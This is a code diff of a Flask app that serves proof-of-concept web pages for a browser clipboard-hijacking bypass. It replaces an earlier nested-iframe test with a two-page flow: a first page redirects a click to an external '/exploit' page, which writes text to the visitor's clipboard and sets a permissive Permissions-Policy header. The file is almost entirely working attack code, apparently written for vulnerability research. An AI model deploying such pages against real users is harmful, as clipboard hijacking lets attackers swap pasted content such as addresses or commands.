@@ -2,54 +2,64 @@ from flask import Flask, Response
 
 app = Flask(__name__)
 
-@app.route("/middle")
-def middle():
+@app.route("/stage1")
+def stage1():
     html_payload = """
     <!DOCTYPE html>
     <html lang="en">
-    <body style="background: #ffe6e6;">
-        <h4>[Level 1] Middle Iframe</h4>
-        <p>Gua gak punya izin, tapi gua inject allow="clipboard-write" ke anak gua.</p>
+    <body style="background: #e0f7fa; font-family: monospace; text-align: center; padding-top: 20px;">
+        <button id="btnLanjut" style="padding: 10px 20px; font-size: 16px; cursor: pointer;">
+            GAS
+        </button>
         
-        <iframe 
-            src="/payload" 
-            allow="clipboard-write" 
-            style="width: 90%; height: 150px; border: 2px dashed blue;">
-        </iframe>
-    </body>
-    </html>
-    """
-    return Response(html_payload, mimetype="text/html")
-
-@app.route("/payload")
-def payload():
-    html_payload = """
-    <!DOCTYPE html>
-    <html lang="en">
-    <body style="background: #e6f7ff;">
-        <h4>[Level 2] Final Payload</h4>
-        <div id="log" style="font-family: monospace; font-size: 11px;"></div>
+        <div id="log" style="margin-top: 15px; text-align: left;"></div>
 
         <script>
-            function log(msg) { document.getElementById('log').innerHTML += "> " + msg + "<br>"; }
-
-            window.onload = () => {
-                log("Waiting 2s for auto-hijack...");
-                setTimeout(async () => {
-                    try {
-                        await navigator.clipboard.writeText("PoC - Nested Iframe Bypass - Putra Mahardika");
-                        log("<span style='color: green; font-weight: bold;'>SUCCESS: Clipboard Hijacked from Level 2!</span>");
-                    } catch (e) {
-                        log("<span style='color: red;'>BLOCKED: " + e.message + "</span>");
-                    }
-                }, 2000);
-            };
+            document.getElementById("btnLanjut").addEventListener("click", (e) => {
+                document.getElementById("log").innerHTML += `> Button clicked (isTrusted: ${e.isTrusted})<br>`;
+                document.getElementById("log").innerHTML += "> Redirecting...<br>";
+                
+                window.location.href = "https://user-activation-production.up.railway.app/exploit";
+            });
         </script>
     </body>
     </html>
     """
     return Response(html_payload, mimetype="text/html")
+@app.route("/exploit")
+def exploit():
+    html_payload = """
+    <!DOCTYPE html>
+    <html lang="en">
+    <body style="background: #ffe6e6; font-family: monospace; text-align: center; padding-top: 20px;">
+        <button id="btnHijack" style="padding: 10px 20px; background: red; color: white; font-size: 16px; font-weight: bold; cursor: pointer;">
+            HIJACK CLIPBOARD
+        </button>
+
+        <div id="log" style="margin-top: 15px; text-align: left;"></div>
+
+        <script>
+            document.getElementById("btnHijack").addEventListener("click", async (e) => {
+                const logDiv = document.getElementById("log");
+                logDiv.innerHTML += `> Hijack clicked (isTrusted: ${e.isTrusted})<br>`;
+                
+                try {
+                    await navigator.clipboard.writeText("PoC VULNERABLE - 1-Click Bypass via HTTP Header");
+                    logDiv.innerHTML += "<span style='color: green; font-weight: bold;'>> SUCCESS: Clipboard Hijacked!</span><br>";
+                } catch (err) {
+                    logDiv.innerHTML += `<span style='color: red;'>> BLOCKED: ${err.message}</span><br>`;
+                }
+            });
+        </script>
+    </body>
+    </html>
+    """
+    
+    resp = Response(html_payload, mimetype="text/html")
+    
+    resp.headers["Permissions-Policy"] = "clipboard-write=(*)"
+    
+    return resp
 
 if __name__ == "__main__":
-    print("[*] Server running on http://127.0.0.1:8080")
     app.run(host="0.0.0.0", port=8080)
